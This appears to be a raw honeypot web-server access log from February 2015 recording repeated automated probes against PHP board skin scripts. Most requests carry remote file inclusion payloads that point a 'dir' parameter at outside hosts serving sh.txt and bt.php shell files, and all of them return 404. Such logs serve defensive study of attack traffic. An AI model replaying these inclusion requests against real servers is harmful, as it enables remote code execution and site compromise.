198.50.146.246 - - [20/Feb/2015:21:56:22 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:21:56:23 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:21:56:23 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:21:56:24 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:21:56:24 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:21:56:25 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
176.31.252.38 - - [20/Feb/2015:21:56:33 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:56:34 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:56:35 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:56:36 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:56:36 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:56:37 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:56:37 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:56:38 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:57:03 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:57:04 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:57:04 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:57:06 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:57:06 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:57:07 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:57:07 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
176.31.252.38 - - [20/Feb/2015:21:57:08 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1" 
112.218.68.155 - - [20/Feb/2015:21:57:14 -0800] "GET ////bbs/skin/dognara_gallery/script_popup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:21:57:16 -0800] "GET ////bbs/skin/dognara_gallery/script_popup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:21:57:16 -0800] "POST ////bbs/skin/dognara_gallery/script_popup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:21:57:18 -0800] "POST ////bbs/skin/dognara_gallery/script_popup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
198.50.146.246 - - [20/Feb/2015:22:02:52 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:22:02:53 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:22:02:53 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:22:02:54 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:22:02:54 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:22:02:55 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:22:02:55 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
198.50.146.246 - - [20/Feb/2015:22:02:56 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)" 
176.31.252.38 - - [20/Feb/2015:22:24:36 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [20/Feb/2015:22:24:37 -0800] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [20/Feb/2015:22:24:38 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [20/Feb/2015:22:24:39 -0800] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [20/Feb/2015:22:24:39 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [20/Feb/2015:22:24:40 -0800] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [20/Feb/2015:22:24:40 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
176.31.252.38 - - [20/Feb/2015:22:24:41 -0800] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows;U;Windows NT 5.1; l-PL;rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4" 
71.6.150.241 - - [20/Feb/2015:22:26:45 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [20/Feb/2015:22:26:46 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [20/Feb/2015:22:26:46 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
71.6.150.241 - - [20/Feb/2015:22:26:47 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)" 
176.31.252.38 - - [20/Feb/2015:22:26:50 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [20/Feb/2015:22:26:52 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [20/Feb/2015:22:26:52 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
176.31.252.38 - - [20/Feb/2015:22:26:53 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1" 
211.47.181.38 - - [20/Feb/2015:22:27:07 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [20/Feb/2015:22:27:09 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
211.47.181.38 - - [20/Feb/2015:22:27:09 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [20/Feb/2015:22:27:09 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [20/Feb/2015:22:27:10 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [20/Feb/2015:22:27:11 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
211.47.181.38 - - [20/Feb/2015:22:27:11 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
112.218.68.155 - - [20/Feb/2015:22:27:13 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)" 
112.218.68.155 - - [20/Feb/2015:22:27:18 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:27:20 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:27:20 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:27:22 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
178.33.226.103 - - [20/Feb/2015:22:27:32 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [20/Feb/2015:22:27:34 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [20/Feb/2015:22:27:34 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [20/Feb/2015:22:27:35 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
71.6.150.241 - - [20/Feb/2015:22:27:58 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:27:59 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:28:02 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:28:03 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
176.31.252.38 - - [20/Feb/2015:22:28:43 -0800] "GET ////skin/happycast_black/write.php?dir= HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [20/Feb/2015:22:28:44 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [20/Feb/2015:22:28:45 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
176.31.252.38 - - [20/Feb/2015:22:28:46 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)" 
203.58.0.155 - - [20/Feb/2015:22:29:26 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
203.58.0.155 - - [20/Feb/2015:22:29:27 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
203.58.0.155 - - [20/Feb/2015:22:29:28 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
203.58.0.155 - - [20/Feb/2015:22:29:30 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)" 
211.47.181.38 - - [20/Feb/2015:22:29:39 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [20/Feb/2015:22:29:40 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [20/Feb/2015:22:29:41 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
211.47.181.38 - - [20/Feb/2015:22:29:42 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible;Baiduspider/2.0;+http://www.baidu.com/search/spider.html)" 
71.6.150.241 - - [20/Feb/2015:22:30:22 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:30:24 -0800] "GET /honeypot////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:30:24 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:30:25 -0800] "POST /honeypot////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:30:26 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:30:27 -0800] "GET ////bbs/skin/ggambo7000_board/setup.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:30:27 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:30:29 -0800] "POST ////bbs/skin/ggambo7000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
114.202.2.31 - - [20/Feb/2015:22:31:26 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [20/Feb/2015:22:31:28 -0800] "GET ////skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [20/Feb/2015:22:31:28 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
114.202.2.31 - - [20/Feb/2015:22:31:30 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox" 
178.33.226.103 - - [20/Feb/2015:22:31:43 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//sh.txt? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [20/Feb/2015:22:31:44 -0800] "GET ////skin/happycast_black/write.php?dir=http://www.se-kwang.co.kr/mods//bt.php? HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [20/Feb/2015:22:31:44 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
178.33.226.103 - - [20/Feb/2015:22:31:46 -0800] "POST ////skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Microsoft Pocket Internet Explorer/0.6" 
71.6.150.241 - - [20/Feb/2015:22:32:16 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:32:17 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:32:17 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
71.6.150.241 - - [20/Feb/2015:22:32:18 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/4.40 (compatible; MSI4E 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" 
112.218.68.155 - - [20/Feb/2015:22:32:22 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:32:23 -0800] "GET ////bbs/skin/happycast_black/write.php?dir=http://183.63.23.90/mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
112.218.68.155 - - [20/Feb/2015:22:32:24 -0800] "POST ////bbs/skin/happycast_black/write.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7" 
